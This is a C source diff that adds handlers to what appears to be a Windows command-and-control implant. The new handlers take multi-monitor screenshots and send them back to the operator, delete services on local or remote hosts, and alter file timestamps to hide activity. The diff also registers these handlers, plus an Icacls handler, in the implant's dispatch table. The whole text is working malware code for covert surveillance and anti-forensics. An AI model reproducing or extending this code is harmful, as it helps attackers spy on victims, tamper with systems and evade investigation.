@@ -3379,6 +3379,77 @@ CLEANUP:
 	return pResult;
 }
 
+PENVELOPE RemoveServiceHandler
+(
+	_In_ PENVELOPE pEnvelope
+)
+{
+	PENVELOPE pResult = NULL;
+	LPVOID* pUnmarshaledData = NULL;
+	PPBElement ReqElements[2];
+	SC_HANDLE hService = NULL;
+	DWORD i = 0;
+	SC_HANDLE hScManager = NULL;
+	PPBElement RecvElementList[2];
+	LPSTR lpServiceName = NULL;
+	LPSTR lpHostname = NULL;
+
+	for (i = 0; i < _countof(ReqElements); i++) {
+		ReqElements[i] = ALLOC(sizeof(PBElement));
+		ReqElements[i]->dwFieldIdx = i + 1;
+		ReqElements[i]->Type = Bytes;
+	}
+
+	pUnmarshaledData = UnmarshalStruct(ReqElements, _countof(ReqElements), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
+	if (pUnmarshaledData == NULL || pUnmarshaledData[0] == NULL) {
+		goto CLEANUP;
+	}
+
+	lpServiceName = DuplicateStrA(((PBUFFER)pUnmarshaledData[0])->pBuffer, 0);
+	if (pUnmarshaledData[1] != NULL) {
+		lpHostname = DuplicateStrA(((PBUFFER)pUnmarshaledData[1])->pBuffer, 0);
+	}
+
+	hScManager = OpenSCManagerA(lpHostname, NULL, SC_MANAGER_ALL_ACCESS);
+	if (hScManager == NULL) {
+		LOG_ERROR("OpenSCManagerA", GetLastError());
+		goto CLEANUP;
+	}
+
+	hService = OpenServiceA(hScManager, lpServiceName, DELETE);
+	if (hService == NULL) {
+		LOG_ERROR("OpenServiceA", GetLastError());
+		goto CLEANUP;
+	}
+
+	if (!DeleteService(hService)) {
+		LOG_ERROR("DeleteService", GetLastError());
+		goto CLEANUP;
+	}
+
+	pResult = ALLOC(sizeof(ENVELOPE));
+	pResult->uID = pEnvelope->uID;
+CLEANUP:
+	FREE(lpServiceName);
+	FREE(lpHostname);
+
+	for (i = 0; i < _countof(ReqElements); i++) {
+		FREE(ReqElements[i]);
+		FREE(pUnmarshaledData[i]);
+	}
+
+	FREE(pUnmarshaledData);
+	if (hScManager != NULL) {
+		CloseServiceHandle(hScManager);
+	}
+
+	if (hService != NULL) {
+		CloseServiceHandle(hService);
+	}
+
+	return pResult;
+}
+
 PENVELOPE StopServiceHandler
 (
 	_In_ PENVELOPE pEnvelope
@@ -3424,6 +3495,91 @@ CLEANUP:
 	}
 
 	FREE(pUnmarshaledData);
+
+	return pResult;
+}
+
+BOOL MonitorEnumProc
+(
+	_In_ HMONITOR hMonitor,
+	_In_ HDC hDC,
+	_In_ LPRECT lpMonitorRect,
+	_In_ PBUFFER** pParam
+)
+{
+	PBUFFER pBitmapBuffer = NULL;
+	PBUFFER* pBufferList = NULL;
+	DWORD dwNumberOfBuffers = 0;
+
+	dwNumberOfBuffers = *((PDWORD)pParam);
+	pBufferList = pParam[1];
+	pBitmapBuffer = CaptureDesktop(hDC);
+	if (pBitmapBuffer != NULL) {
+		if (pBufferList == NULL) {
+			pBufferList = ALLOC(sizeof(PBUFFER*));
+		}
+		else {
+			pBufferList = REALLOC(pBufferList, sizeof(PBUFFER*) * (dwNumberOfBuffers + 1));
+		}
+
+		pBufferList[dwNumberOfBuffers++] = pBitmapBuffer;
+		*((PDWORD)pParam) = dwNumberOfBuffers;
+		pParam[1] = pBufferList;
+	}
+
+	return TRUE;
+}
+
+PENVELOPE ScreenshotHandler
+(
+	_In_ PENVELOPE pEnvelope
+)
+{
+	PENVELOPE pResult = NULL;
+	HDC hDesktopDC = NULL;
+	PBUFFER** pParam = NULL;
+	PBUFFER* BufferList = NULL;
+	DWORD dwNumberOfBuffers = 0;
+	PPBElement pFinalElement = NULL;
+	DWORD i = 0;
+
+	hDesktopDC = GetDC(NULL);
+	if (hDesktopDC == NULL) {
+		LOG_ERROR("GetDC", GetLastError());
+		goto CLEANUP;
+	}
+
+	pParam = ALLOC(sizeof(PBUFFER*) * 2);
+	if (!EnumDisplayMonitors(hDesktopDC, NULL, MonitorEnumProc, pParam)) {
+		LOG_ERROR("EnumDisplayMonitors", GetLastError());
+		goto CLEANUP;
+	}
+
+	BufferList = pParam[1];
+	dwNumberOfBuffers = (DWORD)pParam[0];
+	if (BufferList == NULL || dwNumberOfBuffers == 0) {
+		goto CLEANUP;
+	}
+
+	pFinalElement = CreateRepeatedBytesElement(BufferList, dwNumberOfBuffers, 1);
+	pResult = ALLOC(sizeof(ENVELOPE));
+	pResult->uID = pEnvelope->uID;
+	pResult->pData = BufferMove(pFinalElement->pMarshaledData, pFinalElement->cbMarshaledData);
+	pFinalElement->pMarshaledData = NULL;
+CLEANUP:
+	FreeElement(pFinalElement);
+	FREE(pParam);
+	if (BufferList != NULL) {
+		for (i = 0; i < dwNumberOfBuffers; i++) {
+			FREE(BufferList[i]);
+		}
+
+		FREE(BufferList);
+	}
+
+	if (hDesktopDC != NULL) {
+		ReleaseDC(NULL, hDesktopDC);
+	}
 
 	return pResult;
 }
@@ -3761,6 +3917,110 @@ CLEANUP:
 	FREE(lpProcessIntegrity);
 	FREE(pTokenPrivileges);
 	FreeElement(pFinalElement);
+
+	return pResult;
+}
+
+PENVELOPE ChtimesHandler
+(
+	_In_ PENVELOPE pEnvelope
+)
+{
+	PPBElement ReqElements[4];
+	DWORD i = 0;
+	PENVELOPE pResult = NULL;
+	LPVOID* UnmarshaledData = NULL;
+	LPWSTR lpPath = NULL;
+	BOOL IsDirectory = FALSE;
+	HANDLE hFile = INVALID_HANDLE_VALUE;
+	FILETIME CreationTime;
+	FILETIME LastAccessTime;
+	FILETIME LastWriteTime;
+	SYSTEMTIME Temp;
+	INT UTCOffset = 0;
+
+	UTCOffset = GetUTFOffset();
+	for (i = 0; i < _countof(ReqElements); i++) {
+		ReqElements[i] = ALLOC(sizeof(PBElement));
+		ReqElements[i]->dwFieldIdx = i + 1;
+		ReqElements[i]->Type = Varint;
+	}
+
+	ReqElements[0]->Type = Bytes;
+	UnmarshaledData = UnmarshalStruct(ReqElements, _countof(ReqElements), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
+	if (UnmarshaledData == NULL || UnmarshaledData[0] == NULL) {
+		goto CLEANUP;
+	}
+
+	lpPath = ConvertCharToWchar(((PBUFFER)UnmarshaledData[0])->pBuffer);
+	if (!IsPathExist(lpPath)) {
+		LogError(L"%s is not exist", lpPath);
+		goto CLEANUP;
+	}
+
+	if (!IsFileExist(lpPath)) {
+		IsDirectory = TRUE;
+	}
+
+	if (IsDirectory) {
+		hFile = CreateFileW(lpPath, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
+	}
+	else {
+		hFile = CreateFileW(lpPath, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	}
+
+	if (hFile == INVALID_HANDLE_VALUE) {
+		LOG_ERROR("CreateFileW", GetLastError());
+		goto CLEANUP;
+	}
+
+	if (!GetFileTime(hFile, &CreationTime, &LastAccessTime, &LastWriteTime)) {
+		LOG_ERROR("GetFileTime", GetLastError());
+		goto CLEANUP;
+	}
+
+	if (UnmarshaledData[1] != NULL) {
+		memcpy(&CreationTime, &UnmarshaledData[1], sizeof(FILETIME));
+		FileTimeToSystemTime(&CreationTime, &Temp);
+		Temp.wHour -= UTCOffset;
+		SystemTimeToFileTime(&Temp, &CreationTime);
+	}
+
+	if (UnmarshaledData[2] != NULL) {
+		memcpy(&LastAccessTime, &UnmarshaledData[2], sizeof(FILETIME));
+		FileTimeToSystemTime(&LastAccessTime, &Temp);
+		Temp.wHour -= UTCOffset;
+		SystemTimeToFileTime(&Temp, &LastAccessTime);
+	}
+
+	if (UnmarshaledData[3] != NULL) {
+		memcpy(&LastWriteTime, &UnmarshaledData[3], sizeof(FILETIME));
+		FileTimeToSystemTime(&LastWriteTime, &Temp);
+		Temp.wHour -= UTCOffset;
+		SystemTimeToFileTime(&Temp, &LastWriteTime);
+	}
+
+	if (!SetFileTime(hFile, &CreationTime, &LastAccessTime, &LastWriteTime)) {
+		LOG_ERROR("SetFileTime", GetLastError());
+		goto CLEANUP;
+	}
+
+	pResult = ALLOC(sizeof(ENVELOPE));
+	pResult->uID = pEnvelope->uID;
+CLEANUP:
+	if (hFile != INVALID_HANDLE_VALUE) {
+		CloseHandle(hFile);
+	}
+
+	FREE(lpPath);
+	for (i = 0; i < _countof(ReqElements); i++) {
+		FREE(ReqElements[i]);
+	}
+
+	if (UnmarshaledData != NULL) {
+		FREE(UnmarshaledData[0]);
+		FREE(UnmarshaledData);
+	}
 
 	return pResult;
 }
@@ -4203,6 +4463,7 @@ REQUEST_HANDLER* GetSystemHandler()
 	HandlerList[MsgRegistryListValuesReq] = RegistryListValuesHandler;
 	HandlerList[MsgServicesReq] = ServicesHandler;
 	HandlerList[MsgServiceDetailReq] = ServiceDetailHandler;
+	HandlerList[MsgIcaclsReq] = IcaclsHandler;
 	/*HandlerList[MsgStartServiceByNameReq] = StartServiceByNameHandler;*/
 	HandlerList[MsgPing] = PingHandler;
 	HandlerList[MsgLsReq] = LsHandler;
@@ -4232,15 +4493,15 @@ REQUEST_HANDLER* GetSystemHandler()
 	HandlerList[MsgCreateServiceReq] = CreateServiceHandler;
 	HandlerList[MsgStartServiceReq] = StartServiceHandler;
 	HandlerList[MsgStopServiceReq] = StopServiceHandler;
-	HandlerList[MsgRemoveServiceReq] = NULL;
+	HandlerList[MsgRemoveServiceReq] = RemoveServiceHandler;
 	HandlerList[MsgSetEnvReq] = NULL;
 	HandlerList[MsgUnsetEnvReq] = NULL;
-	HandlerList[MsgScreenshotReq] = NULL;
+	HandlerList[MsgScreenshotReq] = ScreenshotHandler;
 	HandlerList[MsgSideloadReq] = NULL;
 	HandlerList[MsgMakeTokenReq] = MakeTokenHandler;
 	HandlerList[MsgReconfigureReq] = NULL;
 	HandlerList[MsgSSHCommandReq] = NULL;
-	HandlerList[MsgChtimesReq] = NULL;
+	HandlerList[MsgChtimesReq] = ChtimesHandler;
 	HandlerList[MsgRegisterExtensionReq] = NULL;
 	HandlerList[MsgCallExtensionReq] = NULL;
 	HandlerList[MsgListExtensionsReq] = NULL;
